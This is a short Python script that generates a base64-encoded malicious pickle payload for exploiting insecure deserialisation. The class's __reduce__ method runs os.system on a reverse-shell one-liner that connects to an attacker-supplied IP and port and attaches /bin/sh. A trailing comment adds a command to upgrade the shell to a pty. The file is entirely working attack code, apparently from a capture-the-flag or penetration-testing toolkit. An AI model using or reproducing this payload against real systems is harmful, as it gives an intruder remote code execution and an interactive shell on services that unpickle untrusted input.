import pickle
import base64

import sys

ip = sys.argv[1]
port = sys.argv[2]


class PickleRCE(object):
    def __reduce__(self):
        import os

        return (os.system, (command,))


command = f"""python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"""


pickled = "pickled"
payload = base64.b64encode(pickle.dumps(PickleRCE()))
print(payload)

# python3 -c 'import pty; pty.spawn("/bin/bash")'   (upgrade shell)
